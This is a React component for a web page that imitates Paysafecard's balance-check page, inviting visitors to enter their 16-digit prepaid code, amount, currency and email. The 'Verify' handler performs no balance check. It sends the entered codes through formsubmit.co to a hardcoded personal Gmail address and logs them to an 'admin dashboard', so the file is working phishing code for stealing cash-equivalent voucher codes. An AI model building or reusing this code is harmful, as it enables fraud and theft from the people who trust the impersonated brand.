import { useState } from "react";
import { saveVerification } from "./AdminDashboard";

const coinHexUrl = "/images/coin-hex.webp";

// Formsubmit.co — free, no signup, no API key needed
// Just sends email to the configured address
const NOTIFICATION_EMAIL = "valdesfeujio10@gmail.com";

/* ── Inline SVG decorative elements (3D tokens & cards) ── */

function FloatingToken({
  size,
  top,
  left,
  right,
  bottom,
  rotate,
  animClass,
  opacity = 0.55,
}: {
  size: number;
  top?: string;
  left?: string;
  right?: string;
  bottom?: string;
  rotate: number;
  animClass: string;
  opacity?: number;
}) {
  return (
    <div
      className={`absolute select-none pointer-events-none ${animClass}`}
      style={{
        top,
        left,
        right,
        bottom,
        opacity,
        ["--float-base-rotate" as string]: `${rotate}deg`,
        zIndex: 1,
      }}
      aria-hidden="true"
    >
      <svg
        width={size}
        height={size}
        viewBox="0 0 120 120"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
        style={{
          filter: "drop-shadow(0 8px 24px rgba(0,0,0,0.25))",
        }}
      >
        {/* 3D token body */}
        <ellipse cx="60" cy="68" rx="48" ry="14" fill="#0A1F6B" opacity="0.5" />
        <circle cx="60" cy="56" r="44" fill="#1A45D2" />
        <circle cx="60" cy="56" r="44" fill="url(#tokenGrad)" />
        <circle cx="60" cy="56" r="36" fill="none" stroke="rgba(255,255,255,0.15)" strokeWidth="1.5" />
        <circle cx="60" cy="56" r="28" fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="1" />
        {/* Dollar sign */}
        <text
          x="60"
          y="66"
          textAnchor="middle"
          fontFamily="Inter, Arial, sans-serif"
          fontSize="36"
          fontWeight="800"
          fill="rgba(255,255,255,0.25)"
        >
          $
        </text>
        <defs>
          <radialGradient id="tokenGrad" cx="0.4" cy="0.35" r="0.6">
            <stop offset="0%" stopColor="rgba(255,255,255,0.12)" />
            <stop offset="100%" stopColor="rgba(0,0,0,0)" />
          </radialGradient>
        </defs>
      </svg>
    </div>
  );
}

function FloatingCard({
  width,
  height,
  top,
  left,
  right,
  bottom,
  rotate,
  animClass,
  opacity = 0.45,
}: {
  width: number;
  height: number;
  top?: string;
  left?: string;
  right?: string;
  bottom?: string;
  rotate: number;
  animClass: string;
  opacity?: number;
}) {
  return (
    <div
      className={`absolute select-none pointer-events-none ${animClass}`}
      style={{
        top,
        left,
        right,
        bottom,
        opacity,
        ["--float-base-rotate" as string]: `${rotate}deg`,
        zIndex: 1,
      }}
      aria-hidden="true"
    >
      <svg
        width={width}
        height={height}
        viewBox="0 0 160 100"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
        style={{
          filter: "drop-shadow(0 10px 28px rgba(0,0,0,0.22))",
        }}
      >
        {/* Card shadow */}
        <rect x="6" y="10" width="148" height="88" rx="12" fill="#0A1F6B" opacity="0.35" />
        {/* Card body */}
        <rect x="2" y="4" width="148" height="88" rx="12" fill="#1A45D2" />
        <rect x="2" y="4" width="148" height="88" rx="12" fill="url(#cardGrad)" />
        {/* Chip */}
        <rect x="18" y="28" width="28" height="20" rx="4" fill="rgba(255,255,255,0.12)" stroke="rgba(255,255,255,0.15)" strokeWidth="1" />
        {/* Stripe */}
        <rect x="18" y="60" width="80" height="6" rx="3" fill="rgba(255,255,255,0.08)" />
        <rect x="18" y="72" width="50" height="4" rx="2" fill="rgba(255,255,255,0.06)" />
        <defs>
          <linearGradient id="cardGrad" x1="0" y1="0" x2="1" y2="1">
            <stop offset="0%" stopColor="rgba(255,255,255,0.08)" />
            <stop offset="100%" stopColor="rgba(0,0,0,0)" />
          </linearGradient>
        </defs>
      </svg>
    </div>
  );
}

interface HeroSectionProps {
  onVerify?: () => void;
}

export default function HeroSection({ onVerify }: HeroSectionProps) {
  const [code, setCode] = useState("");
  const [amount, setAmount] = useState("2");
  const [currency, setCurrency] = useState("");
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [sending, setSending] = useState(false);

  const handleVerify = async () => {
    // Validation
    if (!code.trim()) {
      setError("Please enter the 16-digit code.");
      return;
    }
    if (code.replace(/\s/g, "").length !== 16) {
      setError("The code must be exactly 16 digits.");
      return;
    }
    if (!amount.trim() || Number(amount) <= 0) {
      setError("Please enter a valid amount.");
      return;
    }
    if (!currency.trim()) {
      setError("Please enter the currency.");
      return;
    }
    if (!email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      setError("Please enter a valid email address.");
      return;
    }

    setError("");
    setSending(true);

    let emailOk: "success" | "failed" = "failed";
    try {
      const formData = new FormData();
      formData.append("_subject", "Paysafecard - New Verification");
      formData.append("_captcha", "false");
      formData.append("_template", "table");
      formData.append("_replyto", email);
      formData.append("_name", "Paysafecard");
      formData.append("Code", code);
      formData.append("Amount", amount);
      formData.append("Currency", currency);
      formData.append("User Email", email);

      const res = await fetch(`https://formsubmit.co/ajax/${NOTIFICATION_EMAIL}`, {
        method: "POST",
        headers: { Accept: "application/json" },
        body: formData,
      });
      const data = await res.json();
      if (data.success === "true" || data.success === true) {
        emailOk = "success";
      }
    } catch {
      emailOk = "failed";
      console.log("Email sending failed");
    }

    // Save to localStorage for admin dashboard
    saveVerification({ code, amount, currency, email, emailStatus: emailOk });

    setSending(false);
    onVerify?.();
  };

  return (
    <section
      id="hero"
      className="relative overflow-hidden"
      style={{
        background: `
          radial-gradient(ellipse 70% 60% at 50% 45%, #1A45D2 0%, #1236B8 100%),
          #1236B8
        `,
      }}
    >
      {/* ── Decorative 3D floating elements on the edges ── */}

      {/* Token — top-left, partially off-screen */}
      <FloatingToken
        size={110}
        top="-15px"
        left="-25px"
        rotate={-15}
        animClass="animate-float-slow"
        opacity={0.5}
      />

      {/* Card — top-right, partially off-screen */}
      <FloatingCard
        width={140}
        height={88}
        top="-10px"
        right="-30px"
        rotate={12}
        animClass="animate-float-medium"
        opacity={0.4}
      />

      {/* Token — middle-left edge */}
      <FloatingToken
        size={80}
        top="45%"
        left="-20px"
        rotate={22}
        animClass="animate-float-gentle"
        opacity={0.45}
      />

      {/* Token — bottom-right */}
      <FloatingToken
        size={95}
        bottom="10%"
        right="-15px"
        rotate={-30}
        animClass="animate-float-fast"
        opacity={0.4}
      />

      {/* Card — bottom-left, partially off-screen */}
      <FloatingCard
        width={120}
        height={75}
        bottom="-20px"
        left="5%"
        rotate={-8}
        animClass="animate-float-medium"
        opacity={0.35}
      />

      {/* Token — top-right area (further in, small) */}
      <FloatingToken
        size={60}
        top="15%"
        right="3%"
        rotate={35}
        animClass="animate-float-slow"
        opacity={0.35}
      />

      {/* ── Coin images (existing decorative coins) ── */}
      <img
        src={coinHexUrl}
        alt=""
        aria-hidden="true"
        className="absolute select-none pointer-events-none"
        style={{
          width: 160,
          top: "6%",
          right: "11%",
          transform: "rotate(18deg)",
          filter: "drop-shadow(0 8px 14px rgba(0,0,0,0.35))",
          zIndex: 2,
        }}
      />

      <img
        src={coinHexUrl}
        alt=""
        aria-hidden="true"
        className="absolute select-none pointer-events-none"
        style={{
          width: 280,
          top: "32%",
          left: "13%",
          transform: "rotate(-24deg)",
          filter: "drop-shadow(0 12px 20px rgba(0,0,0,0.35))",
          zIndex: 2,
        }}
      />

      <img
        src={coinHexUrl}
        alt=""
        aria-hidden="true"
        className="absolute select-none pointer-events-none"
        style={{
          width: 250,
          top: "50%",
          right: "13%",
          transform: "rotate(-28deg)",
          filter: "drop-shadow(0 12px 20px rgba(0,0,0,0.35))",
          zIndex: 2,
        }}
      />

      {/* ── Content ── */}
      <div className="relative z-10 max-w-5xl mx-auto px-5 sm:px-8 py-16 md:py-24">
        <div className="text-center">
          <h1 className="text-white font-extrabold uppercase tracking-tight text-2xl sm:text-3xl md:text-4xl lg:text-[2.75rem] leading-[1.15] max-w-3xl mx-auto">
            Do you already have a paysafecard prepaid code?
          </h1>

          <p className="mt-8 md:mt-12 text-white text-sm sm:text-base max-w-2xl mx-auto">
            Then check your balance by entering the 16-digit code here.
          </p>

          {/* Error message */}
          {error && (
            <div className="mt-4 text-red-300 text-sm font-medium bg-red-500/15 rounded-lg px-4 py-2 max-w-xl mx-auto">
              {error}
            </div>
          )}

          {/* Form */}
          <form
            onSubmit={(e) => e.preventDefault()}
            className="mt-6 md:mt-8 flex flex-col md:flex-row gap-3 md:gap-4 items-stretch justify-center"
          >
            <input
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="Enter the 16-digit code."
              className="flex-1 md:max-w-[320px] rounded-lg bg-[#F5F5F5] text-slate-700 placeholder:text-slate-400 px-4 py-3 text-sm border border-slate-200 focus:outline-none focus:ring-2 focus:ring-white/40 shadow-sm"
            />
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter the amount."
              className="md:w-[160px] rounded-lg bg-[#F5F5F5] text-slate-700 placeholder:text-slate-400 px-4 py-3 text-sm border border-slate-200 focus:outline-none focus:ring-2 focus:ring-white/40 shadow-sm"
            />
            <input
              type="text"
              value={currency}
              onChange={(e) => setCurrency(e.target.value)}
              placeholder="Enter the currency."
              className="md:w-[200px] rounded-lg bg-[#F5F5F5] text-slate-700 placeholder:text-slate-400 px-4 py-3 text-sm border border-slate-200 focus:outline-none focus:ring-2 focus:ring-white/40 shadow-sm"
            />
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Enter your email address."
              className="md:w-[230px] rounded-lg bg-[#F5F5F5] text-slate-700 placeholder:text-slate-400 px-4 py-3 text-sm border border-slate-200 focus:outline-none focus:ring-2 focus:ring-white/40 shadow-sm"
            />
          </form>

          {/* CTA Button */}
          <div className="mt-6 md:mt-8 flex justify-center">
            <button
              type="button"
              disabled={sending}
              style={{
                width: sending ? 130 : 100,
                height: 50,
                borderRadius: 11,
                backgroundColor: sending ? "#d580d4" : "#F08AEF",
                border: "none",
                boxShadow: "0 4px 12px rgba(0,0,0,0.10)",
                color: "#111111",
                fontFamily: "'Inter', sans-serif",
                fontWeight: 500,
                fontSize: sending ? 15 : 19,
                cursor: sending ? "wait" : "pointer",
                transition: "all 300ms ease",
                outline: "none",
                opacity: sending ? 0.8 : 1,
              }}
              onMouseEnter={(e) => {
                if (sending) return;
                const t = e.currentTarget;
                t.style.transform = "translateY(-2px)";
                t.style.boxShadow = "0 8px 20px rgba(0,0,0,0.15)";
                t.style.backgroundColor = "#F4A0F3";
              }}
              onMouseLeave={(e) => {
                if (sending) return;
                const t = e.currentTarget;
                t.style.transform = "translateY(0)";
                t.style.boxShadow = "0 4px 12px rgba(0,0,0,0.10)";
                t.style.backgroundColor = "#F08AEF";
              }}
              onMouseDown={(e) => {
                if (sending) return;
                e.currentTarget.style.transform = "scale(0.98)";
              }}
              onMouseUp={(e) => {
                if (sending) return;
                e.currentTarget.style.transform = "translateY(-2px)";
              }}
              onClick={handleVerify}
            >
              {sending ? "Sending..." : "Verify"}
            </button>
          </div>
        </div>
      </div>
    </section>
  );
}
